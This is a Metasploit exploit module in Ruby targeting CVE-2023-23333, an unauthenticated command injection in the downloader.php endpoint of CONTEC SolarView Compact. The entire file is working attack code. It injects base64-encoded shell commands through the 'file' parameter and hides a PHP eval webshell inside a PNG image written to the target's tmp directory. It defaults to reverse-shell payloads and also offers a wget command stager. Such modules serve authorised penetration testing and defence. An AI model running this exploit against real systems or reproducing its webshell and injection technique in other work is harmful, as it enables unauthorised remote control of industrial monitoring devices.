##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Format::PhpPayloadPng
  prepend Msf::Exploit::Remote::AutoCheck
 
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SolarView Compact unauthenticated remote command execution vulnerability.',
        'Description' => %q{
          CONTEC's SolarView™ Series enables you to monitor and visualize solar power and is only available in Japan.
          This module exploits a command injection vulnerability on the SolarView Compact `v6.00` web application
          via vulnerable endpoint `downloader.php`.
          After exploitation, an attacker will have full access with the same user privileges under
          which the webserver is running (typically as user `contec`).
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # MSF module contributor
        ],
        'References' => [
          ['CVE', '2023-23333'],
          ['URL', 'https://attackerkb.com/topics/kE3lzTZGV2/cve-2023-23333']
        ],
        'DisclosureDate' => '2023-05-15',
        'Platform' => ['php', 'unix', 'linux'],
        'Arch' => [ARCH_PHP, ARCH_CMD, ARCH_ARMLE, ARCH_X64],
        'Privileged' => false,
        'Targets' => [
          [
            'PHP',
            {
              'Platform' => 'php',
              'Arch' => ARCH_PHP,
              'Type' => :php,
              'DefaultOptions' => {
                'PAYLOAD' => 'php/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_ARMLE],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['wget', 'printf', 'echo', 'bourne'],
              'Linemax' => 65535,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/armle/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 80,
          'SSL' => false,
          'HttpClientTimeout' => 40 # set to 40 seconds because http response is pretty slow.
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [ true, 'The SolarView endpoint URL', '/' ]),
      OptString.new('WEBSHELL', [
        false, 'The name of the webshell with extension. Webshell name will be randomly generated if left unset.', nil
      ], conditions: %w[TARGET == 0])
    ])
  end
 
  def upload_webshell
    # randomize file name if option WEBSHELL is not set
    @webshell_name = if datastore['WEBSHELL'].blank?
                       "#{Rex::Text.rand_text_alpha(8..16)}.php"
                     else
                       datastore['WEBSHELL'].to_s
                     end
 
    @post_param = Rex::Text.rand_text_alphanumeric(1..8)
 
    # inject PHP payload into the PLTE chunk of a PNG image to hide the payload
    php_payload = "<?php @eval(base64_decode($_POST[\'#{@post_param}\']));?>"
    png_webshell = inject_php_payload_png(php_payload, injection_method: 'PLTE')
    return nil if png_webshell.nil?
 
    # encode webshell data and write to file on the target at the tmp directory for execution
    # the tmp directory is writeable and a symbolic link to /tmp in a standard solarview installation
    payload = Base64.strict_encode64(png_webshell.to_s)
    cmd = "echo #{payload}|base64 -d >tmp/#{@webshell_name}"
    return execute_command(cmd)
  end
 
  def execute_php(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    return send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'tmp', @webshell_name),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        @post_param => payload
      }
    })
  end
 
  def execute_command(cmd, _opts = {})
    # Encode payload with base64 to ensure proper execution
    payload = Base64.strict_encode64(cmd)
    cmd = "echo #{payload}|base64 -d|bash"
    return send_request_cgi({
      'method' => 'GET',
      'ctype' => 'application/x-www-form-urlencoded',
      'uri' => normalize_uri(target_uri.path, 'downloader.php'),
      'vars_get' => {
        'file' => ";#{cmd};.zip"
      }
    })
  end
 
  def check
    # Checking if the target is vulnerable by echoing a randomised marker that will return the marker in the response.
    # next we will try to read the version file stored in /opt/svc/version
    print_status("Checking if #{peer} can be exploited.")
    marker = Rex::Text.rand_text_alphanumeric(8..16)
    res = execute_command("echo #{marker};cat /opt/svc/version")
    if res && res.code == 200 && res.body.include?(marker)
      CheckCode::Vulnerable(res.body.match(/SolarView Compact ver\.\d\.\d\d/).to_s)
    else
      CheckCode::Safe('No valid response received from the target.')
    end
  end
 
  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :php
      res = upload_webshell
      fail_with(Failure::PayloadFailed, 'Web shell upload error.') unless res && res.code == 200
      register_file_for_cleanup(@webshell_name.to_s)
      execute_php(payload.encoded)
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      # Don't check the response here since the server won't respond
      # if the payload is successfully executed.
      execute_cmdstager({ linemax: target.opts['Linemax'] })
    end
  end
end
 